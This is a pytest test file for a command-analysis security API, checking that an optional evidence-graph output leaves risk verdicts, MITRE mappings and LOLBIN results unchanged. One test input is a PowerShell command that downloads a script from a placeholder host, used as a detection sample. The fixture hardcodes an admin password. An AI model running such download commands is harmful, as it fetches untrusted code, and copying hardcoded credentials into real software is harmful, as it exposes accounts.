"""Phase 11.0/11.1 · Evidence Graph exposure on /api/rc5/parse.

Verifies the side-car is:
* Absent when `NIVX_EVIDENCE_GRAPH=off`.
* Present + well-formed when `NIVX_EVIDENCE_GRAPH=sidecar`.
* Never a verdict driver — verdict fields identical between modes.

Note on isolation
-----------------
`evidence_graph_mode()` reads `NIVX_EVIDENCE_GRAPH` at call time, so we
toggle the env var per-test WITHOUT reloading the app. A single shared
TestClient keeps runtime low and avoids cross-test state pollution from
`sys.modules` mutation.
"""
import os
import sys

import pytest
from fastapi.testclient import TestClient


@pytest.fixture(scope="module")
def client():
    # Hermetic env setup — matches the neighbouring test_diag_endpoint fixture.
    os.environ["RC5_DIAG_ENABLED"] = "true"
    os.environ["ADMIN_EMAIL"] = "admin@nivxray.com"
    os.environ["ADMIN_PASSWORD"] = "uulVDp5cCSB3Hva99s7UUAwK"
    os.environ.setdefault("JWT_SECRET", "test-jwt-secret-do-not-use-in-prod")
    os.environ.setdefault("EMERGENT_LLM_KEY", "test-key")
    os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
    os.environ.setdefault("DB_NAME", "test_nivxray")
    for mod in ("deps", "server"):
        if mod in sys.modules:
            del sys.modules[mod]
    from server import app
    with TestClient(app) as c:
        yield c


@pytest.fixture(scope="module")
def token(client):
    r = client.post("/api/auth/login", json={
        "email": os.environ["ADMIN_EMAIL"],
        "password": os.environ["ADMIN_PASSWORD"],
    })
    assert r.status_code == 200, r.text
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def auth(token):
    return {"Authorization": f"Bearer {token}"}


def _parse(client, auth, mode: str, payload: dict):
    """Toggle the flag at call time and hit `/api/rc5/parse`."""
    os.environ["NIVX_EVIDENCE_GRAPH"] = mode
    r = client.post("/api/rc5/parse", headers=auth, json=payload)
    assert r.status_code == 200, r.text
    return r.json()


def test_evidence_graph_absent_when_flag_off(client, auth):
    body = _parse(client, auth, "off",
                  {"input": "cmd /c echo hi", "language": "cmd"})
    assert body.get("evidence_graph") is None
    assert body.get("evidence_graph_metrics") is None


def test_evidence_graph_present_and_wellformed_when_sidecar(client, auth):
    body = _parse(client, auth, "sidecar",
                  {"input": "powershell -c iwr http://x.example/a.ps1",
                   "language": "powershell"})
    eg = body["evidence_graph"]
    assert eg is not None
    assert set(eg.keys()) == {"schema_version", "nodes", "edges"}
    assert eg["schema_version"] == 1
    # At least the synthetic root + one real entity.
    assert len(eg["nodes"]) >= 2
    for n in eg["nodes"]:
        assert n["id"].startswith("eg_") and len(n["id"]) == 19
    for e in eg["edges"]:
        assert e["id"].startswith("ee_") and len(e["id"]) == 19


def test_evidence_graph_does_not_influence_verdict(client, auth):
    """Turning the sidecar on must not change any *semantic* verdict
    field — the graph is observational only. Internal UUIDs (behavior
    IDs, node IDs) are regenerated per pipeline run and are expected to
    differ; the SUBSTANTIVE verdict outputs must match exactly.
    """
    payload = {"input": "cmd /c echo hi", "language": "cmd"}
    body_off = _parse(client, auth, "off", payload)
    body_on = _parse(client, auth, "sidecar", payload)

    v_off, v_on = body_off["verdict_v2"], body_on["verdict_v2"]
    # Verdict tier, risk score, and per-dimension scores must be identical.
    assert v_off["verdict"] == v_on["verdict"]
    assert v_off["risk"] == v_on["risk"]
    assert v_off["raw_risk"] == v_on["raw_risk"]
    assert v_off["scores"] == v_on["scores"]
    # Reason strings and tactics identical; behavior UUIDs excluded.
    reasons_off = [(r["reason"], r["tactic"], r["contribution"])
                   for r in v_off.get("top_reasons", [])]
    reasons_on  = [(r["reason"], r["tactic"], r["contribution"])
                   for r in v_on.get("top_reasons", [])]
    assert reasons_off == reasons_on

    # MITRE stable fields: technique_id, tactic, confidence.
    mitre_off = [(m.get("technique_id"), m.get("tactic"), m.get("confidence"))
                 for m in body_off["mitre"]]
    mitre_on  = [(m.get("technique_id"), m.get("tactic"), m.get("confidence"))
                 for m in body_on["mitre"]]
    assert mitre_off == mitre_on

    # LOLBIN kinds / names identical.
    lb_off = [(r.get("binary"), r.get("state")) for r in body_off["lolbins_v2"]]
    lb_on  = [(r.get("binary"), r.get("state")) for r in body_on["lolbins_v2"]]
    assert lb_off == lb_on

    # Confidence summary identical.
    assert body_off["confidence_summary"] == body_on["confidence_summary"]

    # ExecGraph node COUNT and KIND sequence identical (IDs differ per run).
    kinds_off = [n["kind"] for n in body_off["exec_graph"]["nodes"]]
    kinds_on  = [n["kind"] for n in body_on["exec_graph"]["nodes"]]
    assert kinds_off == kinds_on


def test_status_endpoint_reports_evidence_graph_mode(client, auth):
    os.environ["NIVX_EVIDENCE_GRAPH"] = "sidecar"
    r = client.get("/api/rc5/status", headers=auth)
    assert r.status_code == 200
    body = r.json()
    assert body["evidence_graph"]["mode"] == "sidecar"
    assert body["evidence_graph"]["schema_version"] == 1
